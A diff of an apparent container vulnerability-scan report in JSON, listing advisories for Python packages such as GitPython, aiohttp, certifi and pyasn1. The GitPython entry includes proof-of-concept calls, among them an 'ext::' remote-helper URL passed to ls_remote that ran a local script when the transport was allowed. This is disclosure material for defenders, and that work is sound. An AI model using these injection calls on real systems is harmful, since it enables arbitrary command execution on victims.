+          "Description": "### Summary\n\nGitPython has spent 2022-2026 rolling out two reusable guards method-by-method: `Git.check_unsafe_protocols(url)` (raises `UnsafeProtocolError` for `<transport>::` remote-helper URLs - CVE-2022-24439) and `Git.check_unsafe_options(...)` (raises `UnsafeOptionError` for denylisted option spellings - CVE-2023-40267, CVE-2026-42215, CVE-2026-67323). Three wrapper methods that build a `git` argv from caller-controlled values still have **neither**:\n\n1. **`Git.ls_remote`** (git/cmd.py:1128-1143) - checks options (:1139-1141) but forwards the URL positional unchecked; no `allow_unsafe_protocols` parameter exists. The same URL through `clone_from` raises `UnsafeProtocolError`.\n2. **`Repo.merge_base`** (git/repo/base.py:895-936) - forwards `**kwargs`/`*rev` to `self.git.merge_base` with no guard; guarded sibling `iter_commits` sits 12 lines up. Its exception handler additionally swallows every non-128 `GitCommandError` into `[]`, masking the injection.\n3. **`IndexFile.move`** (git/index/base.py:1092-1168) - forwards `**kwargs` to `git mv` twice (:1147, :1167); guarded sibling `remove()` is 23 lines above.\n\nVerified unfixed on `main @ a54d159` (2026-09-21), post-dating latest release 3.1.62 (2026-09-07) - all three sites re-verified today.\n\n### Impact\n\n**Site 1 (`ls_remote`)** - RCE conditional on the victim git transport policy. The common 'probe first, then clone' pattern (`Git(...).ls_remote(attacker_url)`) with an `ext::sh -c ...` URL executes arbitrary commands when the victim git permits the ext transport: dynamically verified with `protocol.ext.allow=always` (marker executed). git >= 2.38.1 stock config refuses the transport (`fatal: transport 'ext' not allowed`, rc 128) - GitPython adds no defense-in-depth and surfaces a bare `GitCommandError`. Environments on git < 2.38.1 are exposed with stock config - the exact population CVE-2022-24439 was scored against.\n\n**Sites 2/3** - latent argument-injection surface: caller kwargs flow 1:1 into the `git` argv before operands and `--` (cmd.py:1850 `opt_args + ext_args`), and `execute_kwargs` (incl. `shell=True`/`env` - the CVE-2023-40267 Windows mechanism) passes through unguarded. Today `git merge-base`/`git mv` expose no exec option, so we claim the missing-guard class (vendor-settled by CVE-2026-67323, which bundled archive/ls_remote/iter_commits/blame in one advisory), not direct RCE.\n\n### Dynamic verification (today; GitPython main @ a54d159, git 2.55.0, Linux)\n\n| # | Call | Result |\n|---|---|---|\n| T1 | `repo.git.ls_remote('ext::/tmp/gp_touch.sh')`, stock config | git refuses (rc 128); **no `UnsafeProtocolError` from GitPython** |\n| T1b | same + victim config `protocol.ext.allow=always` | **marker created - arbitrary command executed** |\n| T2 | `repo.git.ls_remote('.', upload_pack=...)` | blocked by cmd.py:1141 (options-side fixed - protocol-side is the residual gap) |\n| T3 | `repo.merge_base('main','side', upload_pack=...)` | **not blocked**; argv `git merge-base --upload-pack=... main side`; rc 129 silently converted to `[]` |\n| T4 | `repo.index.move(['f1','f2'], output=...)` | **not blocked**; option reaches `git mv` (rc 129) |\n\n### Coverage matrix (main @ a54d159)\n\n`check_unsafe_protocols`: 7 call sites (`_clone`, `archive`, `set_url`, `create`, `fetch`, `pull`, `push`) - none on `ls_remote`.\n`check_unsafe_options`: 24 call sites incl. `ls_remote`, `iter_commits`, `IndexFile.remove` - absent on `merge_base` and `move`.\n\n### Precedents (same repo, same guard family)\n\n- **CVE-2022-24439 / GHSA-hcpj-qp55-gfph** (critical): `check_unsafe_protocols` on the clone path - Site 1 is the same `ext::` primitive on a sibling API.\n- **CVE-2023-40267 / GHSA-pr76-5cm5-w9cj** (critical, 'incomplete fix for CVE-2022-24439'): `check_unsafe_options` - unguarded kwargs to argv treated as RCE (`shell=True` on Windows).\n- **CVE-2026-42215 / GHSA-rpm5-65cw-6hj4** (high, fixed 3.1.47): underscored-spelling bypass - rollout still active in 2026.\n- **CVE-2026-67323 / GHSA-956x-8gvw-wg5v** (high, 8.4, fixed 3.1.51): added `check_unsafe_options` to `archive`/`ls_remote`/`iter_commits`/`blame`; its PoC is literally `repo.git.ls_remote('.', upload_pack=...)`. Establishes that a wrapper missing the check is itself a vulnerability. This report is the residual gap of that rollout: `ls_remote` got options but not protocols; `merge_base`/`move` got neither.\n\n### Recommended fix (existing helpers, 1-3 lines per site)\n\n1. `Git.ls_remote`: `if not allow_unsafe_protocols: self.check_unsafe_protocols(args[0])` + new `allow_unsafe_protocols: bool = False` (the `_clone` pattern, base.py:1536-1538).\n2. `Repo.merge_base`: `check_unsafe_options(Git._option_candidates(list(rev), kwargs), unsafe_options=self.unsafe_git_revision_options)` (the `iter_commits` pattern); stop masking non-128 statuses.\n3. `IndexFile.move`: the `remove()` pattern with `unsafe_git_pathspec_from_file_options`.\n\nOne advisory, three affected methods, severity anchored on Site 1 - mirroring CVE-2026-67323's bundling.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/9ad28cc4c7176d22cd6181d69805058a719dd03b",
+            "https://github.com/gitpython-developers/GitPython/pull/2251",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.0",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-w8jc-g24h-crhw"
+          ],
+          "PublishedDate": "2026-10-27T15:26:43Z",
+          "LastModifiedDate": "2026-10-27T15:26:43Z"
         },
         {
           "VulnerabilityID": "CVE-2020-14343",
@@ -1801,7 +2061,16 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2021:4151",
             "https://access.redhat.com/security/cve/CVE-2021-20270",
+            "https://bugzilla.redhat.com/1889886",
+            "https://bugzilla.redhat.com/1922136",
+            "https://bugzilla.redhat.com/1928707",
+            "https://bugzilla.redhat.com/1928904",
+            "https://bugzilla.redhat.com/1940603",
+            "https://bugzilla.redhat.com/1941534",
+            "https://bugzilla.redhat.com/1945483",
+            "https://bugzilla.redhat.com/1955615",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1889886",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1922136",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1928707",
@@ -1901,7 +2170,16 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2021:4151",
             "https://access.redhat.com/security/cve/CVE-2021-27291",
+            "https://bugzilla.redhat.com/1889886",
+            "https://bugzilla.redhat.com/1922136",
+            "https://bugzilla.redhat.com/1928707",
+            "https://bugzilla.redhat.com/1928904",
+            "https://bugzilla.redhat.com/1940603",
+            "https://bugzilla.redhat.com/1941534",
+            "https://bugzilla.redhat.com/1945483",
+            "https://bugzilla.redhat.com/1955615",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1889886",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1922136",
             "https://bugzilla.redhat.com/show_bug.cgi?id=1928707",
@@ -2072,6 +2350,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2024-34069",
+            "https://advisory.echohq.com/cve/CVE-2024-34069",
             "https://github.com/pallets/werkzeug",
             "https://github.com/pallets/werkzeug/commit/3386395b24c7371db11a5b8eaac0c91da5362692",
             "https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985",
@@ -2145,6 +2424,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2024-23334",
+            "https://advisory.echohq.com/cve/CVE-2024-23334",
+            "https://github.com/advisories/GHSA-5h86-8mv2-jq9f",
             "https://github.com/aio-libs/aiohttp",
             "https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b",
             "https://github.com/aio-libs/aiohttp/pull/8079",
@@ -2214,6 +2495,8 @@
           "References": [
             "http://www.openwall.com/lists/oss-security/2024/05/02/4",
             "https://access.redhat.com/security/cve/CVE-2024-30251",
+            "https://advisory.echohq.com/cve/CVE-2024-30251",
+            "https://github.com/advisories/GHSA-5m98-qgg9-wh84",
             "https://github.com/aio-libs/aiohttp",
             "https://github.com/aio-libs/aiohttp/commit/7eecdff163ccf029fbb1ddc9de4169d4aaeb6597",
             "https://github.com/aio-libs/aiohttp/commit/cebe526b9c34dc3a3da9140409db63014bc4cf19",
@@ -2263,6 +2546,7 @@
           ],
           "VendorSeverity": {
             "ghsa": 3,
+            "oracle-oval": 3,
             "redhat": 3,
             "ubuntu": 2
           },
@@ -2302,17 +2586,145 @@
             "https://access.redhat.com/errata/RHSA-2026:6308",
             "https://access.redhat.com/errata/RHSA-2026:6309",
             "https://access.redhat.com/security/cve/CVE-2025-69223",
+            "https://advisory.echohq.com/cve/CVE-2025-69223",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2427456",
             "https://github.com/aio-libs/aiohttp",
             "https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a",
             "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-6mq8-rvhq-8wgg",
+            "https://linux.oracle.com/cve/CVE-2025-69223.html",
+            "https://linux.oracle.com/errata/ELSA-2026-604898.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2025-69223",
             "https://security.access.redhat.com/data/csaf/v2/vex/2025/cve-2025-69223.json",
             "https://ubuntu.com/security/notices/USN-8032-1",
             "https://www.cve.org/CVERecord?id=CVE-2025-69223"
           ],
           "PublishedDate": "2026-01-05T22:15:53.017Z",
-          "LastModifiedDate": "2026-09-30T22:10:00.273Z"
+          "LastModifiedDate": "2026-10-11T20:10:00.2Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-111064",
+          "VendorIDs": [
+            "GHSA-5wr8-gcqf-gqf3"
+          ],
+          "PkgName": "aiohttp",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/aiohttp-3.7.3.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/aiohttp@3.7.3",
+            "UID": "db90ae50eb20651e"
+          },
+          "InstalledVersion": "3.7.3",
+          "FixedVersion": "3.14.4",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-111064",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:81fbdae0dd6750f289869cbe84c01a1e4392d238a50a2ca711a0dc86318d03ba",
+          "Title": "aiohttp: aiohttp: Denial of Service via missing initial request timeout",
+          "Description": "AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, keepalive timeout handling is absent during the initial portion of a request. An attacker can keep an idle connection open indefinitely before sending any request data, consuming server connection capacity. This issue is fixed in version 3.14.4.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-111064",
+            "https://advisory.echohq.com/cve/CVE-2026-111064",
+            "https://github.com/aio-libs/aiohttp",
+            "https://github.com/aio-libs/aiohttp/commit/be846822b4b3a5a54b6163e794b42dc06fba54a3",
+            "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4",
+            "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5wr8-gcqf-gqf3",
+            "https://linux.oracle.com/cve/CVE-2026-111064.html",
+            "https://linux.oracle.com/errata/ELSA-2026-604898.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-111064",
+            "https://www.cve.org/CVERecord?id=CVE-2026-111064"
+          ],
+          "PublishedDate": "2026-10-19T17:17:03.377Z",
+          "LastModifiedDate": "2026-10-28T16:17:01.09Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-111066",
+          "VendorIDs": [
+            "GHSA-9xw5-w5jj-pvcg"
+          ],
+          "PkgName": "aiohttp",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/aiohttp-3.7.3.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/aiohttp@3.7.3",
+            "UID": "db90ae50eb20651e"
+          },
+          "InstalledVersion": "3.7.3",
+          "FixedVersion": "3.14.4",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-111066",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:983959c69bb0d979575d12b935d6f5514d64f18f2249af846c3e6da4172e99ac",
+          "Title": "aiohttp: aiohttp: Denial of Service via file descriptor exhaustion in multipart request processing",
+          "Description": "AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. From 2.0.0 until 3.14.4, multipart request processing can retain an unbounded number of open file descriptors. An unauthenticated attacker can consequently exhaust file descriptors with specially crafted multipart requests when a handler uses Request.post(). This issue is fixed in version 3.14.4.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-111066",
+            "https://advisory.echohq.com/cve/CVE-2026-111066",
+            "https://github.com/aio-libs/aiohttp",
+            "https://github.com/aio-libs/aiohttp/commit/2d94633b7f1b4c1ba07d647b629a8440652b2d09",
+            "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4",
+            "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-9xw5-w5jj-pvcg",
+            "https://linux.oracle.com/cve/CVE-2026-111066.html",
+            "https://linux.oracle.com/errata/ELSA-2026-604898.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-111066",
+            "https://www.cve.org/CVERecord?id=CVE-2026-111066"
+          ],
+          "PublishedDate": "2026-10-19T17:17:03.637Z",
+          "LastModifiedDate": "2026-10-20T17:17:29.313Z"
         },
         {
           "VulnerabilityID": "CVE-2026-69244",
@@ -2350,6 +2762,7 @@
           ],
           "VendorSeverity": {
             "ghsa": 3,
+            "oracle-oval": 3,
             "redhat": 3
           },
           "CVSS": {
@@ -2364,16 +2777,119 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-69244",
+            "https://advisory.echohq.com/cve/CVE-2026-69244",
             "https://github.com/aio-libs/aiohttp",
             "https://github.com/aio-libs/aiohttp/commit/49f65d54150397892f7bcc4aae887767d51c322d",
             "https://github.com/aio-libs/aiohttp/pull/13223",
             "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.3",
             "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-cq5v-8q36-5273",
+            "https://linux.oracle.com/cve/CVE-2026-69244.html",
+            "https://linux.oracle.com/errata/ELSA-2026-604898.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-69244",
             "https://www.cve.org/CVERecord?id=CVE-2026-69244"
           ],
           "PublishedDate": "2026-08-03T21:16:42.273Z",
-          "LastModifiedDate": "2026-09-10T20:36:14.34Z"
+          "LastModifiedDate": "2026-10-23T21:10:00.157Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-2g87-pp6c-29x5",
+          "PkgName": "aiohttp",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/aiohttp-3.7.3.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/aiohttp@3.7.3",
+            "UID": "db90ae50eb20651e"
+          },
+          "InstalledVersion": "3.7.3",
+          "FixedVersion": "3.14.4",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-2g87-pp6c-29x5",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:ff1b78ec345533140883c2c85cc3209fbc1d5fe9d18d84e487d41486cd711106",
+          "Title": "aiohttp: Multiple instances of excessive or unbounded memory/CPU use",
+          "Description": "### Summary\n\nMultiple cases were found where aiohttp could use excessive or unbounded memory, or excessive CPU consumption on attacker controlled requests.\n\n### Impact\n\nAn attacker could cause resource exhaustion through specially crafted requests.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/aio-libs/aiohttp",
+            "https://github.com/aio-libs/aiohttp/commit/09bcaa73ff084a0c539bbf16a0a78743acb7141f",
+            "https://github.com/aio-libs/aiohttp/commit/0ae507423f681161efa77d20052b4054397c7fb6",
+            "https://github.com/aio-libs/aiohttp/commit/3d850ee9b92573c7e913821cbcb96005beb3f4df",
+            "https://github.com/aio-libs/aiohttp/commit/47babd8c23ca79e2bae6cc8dcb5752b61e369fc7",
+            "https://github.com/aio-libs/aiohttp/commit/615fec3d4f088f30d2ee72cad760152e92aa1c53",
+            "https://github.com/aio-libs/aiohttp/commit/6963ee0befec1502b6bb7b4db6c72d044c08f4fa",
+            "https://github.com/aio-libs/aiohttp/commit/6a4f6682817839313b04b8e5cea2b39c1a88ab4f",
+            "https://github.com/aio-libs/aiohttp/commit/8cfbe9abe5e11b84006a10f9bdf82bf607671dab",
+            "https://github.com/aio-libs/aiohttp/commit/a555ab698e08e9baea7386d5b4c0761cb8956fdd",
+            "https://github.com/aio-libs/aiohttp/commit/c6ac0e44c3c573ff9616f4a6a532992538b31e43",
+            "https://github.com/aio-libs/aiohttp/commit/d925a80539ffd227da1d93ab4a5bff123cc777db",
+            "https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4",
+            "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-2g87-pp6c-29x5"
+          ],
+          "PublishedDate": "2026-10-19T17:07:23Z",
+          "LastModifiedDate": "2026-10-19T17:07:23Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-6q48-6c7w-9gw2",
+          "PkgName": "certifi",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/certifi-2020.11.8-py3.7.egg-info/PKG-INFO",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/certifi@2020.11.8",
+            "UID": "419482ab814d3542"
+          },
+          "InstalledVersion": "2020.11.8",
+          "FixedVersion": "2026.10.18",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-6q48-6c7w-9gw2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:452b122c18044e8995d1ff06a1c9573cee1b2d69e724fa544081b567f5415d57",
+          "Title": "certifi bundles emSign root CAs with compromised intermediate CA keys",
+          "Description": "Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. \n\nAn attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.\n\nCertifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 9.1
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-6q48-6c7w-9gw2",
+            "https://discuss.python.org/t/information-for-python-users-regarding-emudhra-emsign-ca-certificate-security-incident/109576",
+            "https://emudhra.we-have-a-problem.com",
+            "https://github.com/advisories/GHSA-6q48-6c7w-9gw2",
+            "https://github.com/certifi/python-certifi",
+            "https://github.com/certifi/python-certifi/security/advisories/GHSA-6q48-6c7w-9gw2"
+          ],
+          "PublishedDate": "2026-10-20T19:35:05Z",
+          "LastModifiedDate": "2026-10-26T16:02:12Z"
         },
         {
           "VulnerabilityID": "CVE-2023-37920",
@@ -2637,6 +3153,19 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2164497",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2164499",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2164500",
+            "https://cert-portal.siemens.com/productcert/html/ssa-028723.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-203374.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-264815.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-337522.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-398330.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-455250.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-556635.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-561322.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-625862.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-769027.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-794697.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-879734.html",
+            "https://cert-portal.siemens.com/productcert/html/ssa-943925.html",
             "https://creativecommons.org/licenses/by/4.0/",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4203",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4304",
@@ -2671,7 +3200,7 @@
             "https://www.openssl.org/news/secadv/20230207.txt"
           ],
           "PublishedDate": "2023-02-08T20:15:24.267Z",
-          "LastModifiedDate": "2026-06-17T05:25:12.637Z"
+          "LastModifiedDate": "2026-10-14T20:17:22.45Z"
         },
         {
           "VulnerabilityID": "CVE-2023-50782",
@@ -2732,6 +3261,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2023-50782",
+            "https://advisory.echohq.com/cve/CVE-2023-50782",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2254432",
             "https://github.com/openssl/openssl/pull/13817",
             "https://github.com/pyca/cryptography",
@@ -2787,6 +3317,7 @@
             "ghsa": 3,
             "nvd": 2,
             "oracle-oval": 3,
+            "photon": 2,
             "redhat": 3,
             "rocky": 3,
             "ubuntu": 2
@@ -2828,6 +3359,7 @@
             "https://access.redhat.com/errata/RHSA-2026:6568",
             "https://access.redhat.com/errata/RHSA-2026:7295",
             "https://access.redhat.com/security/cve/CVE-2026-26007",
+            "https://advisory.echohq.com/cve/CVE-2026-26007",
             "https://bugzilla.redhat.com/2438762",
             "https://bugzilla.redhat.com/2447194",
             "https://bugzilla.redhat.com/2448553",
@@ -2891,6 +3423,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-537c-gmf6-5ccf",
+            "https://github.com/advisories/GHSA-537c-gmf6-5ccf",
             "https://github.com/pyca/cryptography",
             "https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf",
             "https://openssl-library.org/news/secadv/20260609.txt"
@@ -3071,6 +3605,7 @@
           ],
           "VendorSeverity": {
             "alma": 3,
+            "amazon": 2,
             "ghsa": 3,
             "oracle-oval": 3,
             "redhat": 3,
@@ -3091,6 +3626,7 @@
             "https://access.redhat.com/errata/RHSA-2026:48585",
             "https://access.redhat.com/errata/RHSA-2026:50317",
             "https://access.redhat.com/security/cve/CVE-2026-59939",
+            "https://advisory.echohq.com/cve/CVE-2026-59939",
             "https://bugzilla.redhat.com/2498212",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2498212",
             "https://creativecommons.org/licenses/by/4.0/",
@@ -3481,7 +4017,7 @@
             "https://www.oracle.com/security-alerts/cpujul2022.html"
           ],
           "PublishedDate": "2021-11-10T18:15:09.51Z",
-          "LastModifiedDate": "2026-08-25T16:28:27.31Z"
+          "LastModifiedDate": "2026-10-08T21:17:40.637Z"
         },
         {
           "VulnerabilityID": "CVE-2022-1941",
@@ -3628,6 +4164,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2025-4565",
+            "https://advisory.echohq.com/cve/CVE-2025-4565",
             "https://github.com/protocolbuffers/protobuf",
             "https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98",
             "https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478",
@@ -3721,6 +4258,7 @@
             "https://access.redhat.com/errata/RHSA-2026:8747",
             "https://access.redhat.com/errata/RHSA-2026:8748",
             "https://access.redhat.com/security/cve/CVE-2026-0994",
+            "https://advisory.echohq.com/cve/CVE-2026-0994",
             "https://bugzilla.redhat.com/2432398",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2432398",
             "https://creativecommons.org/licenses/by/4.0/",
@@ -3744,6 +4282,246 @@
           ],
           "PublishedDate": "2026-01-23T15:16:06.84Z",
           "LastModifiedDate": "2026-09-01T13:18:07.523Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-119194",
+          "VendorIDs": [
+            "GHSA-fm9c-5rcf-2q5p"
+          ],
+          "PkgName": "pyasn1",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/pyasn1-0.4.8.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyasn1@0.4.8",
+            "UID": "f656d1b01a8f28fb"
+          },
+          "InstalledVersion": "0.4.8",
+          "FixedVersion": "0.6.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-119194",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:34ef3cd097a2ec9acdf766a431e218d1696f56d3dada649112b7710d31b403ba",
+          "Title": "pyasn1: pyasn1: Denial of Service via hash collisions in schemaless decoding",
+          "Description": "pyasn1 is a generic ASN.1 library for Python. From 0.3.3 until 0.6.5, schemaless container decoding stores every decoded component's TagSet in a growing set even though only one-versus-multiple tag types must be distinguished. Attacker-controlled BER, CER, or DER input contains many distinct long tag IDs whose TagSet hashes collide. Each later set insertion compares against an increasing number of earlier colliding tags in ConstructedPayloadDecoderBase._decodeComponentsSchemaless, producing quadratic CPU work while decoded values and order remain valid. Repeated inputs can exhaust decoder CPU and reduce service availability. This issue is fixed in version 0.6.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-407"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-119194",
+            "https://advisory.echohq.com/cve/CVE-2026-119194",
+            "https://github.com/pyasn1/pyasn1",
+            "https://github.com/pyasn1/pyasn1/commit/a36e3a3d067148d26197a6b7221fd0e2cde9cc86",
+            "https://github.com/pyasn1/pyasn1/pull/132",
+            "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5",
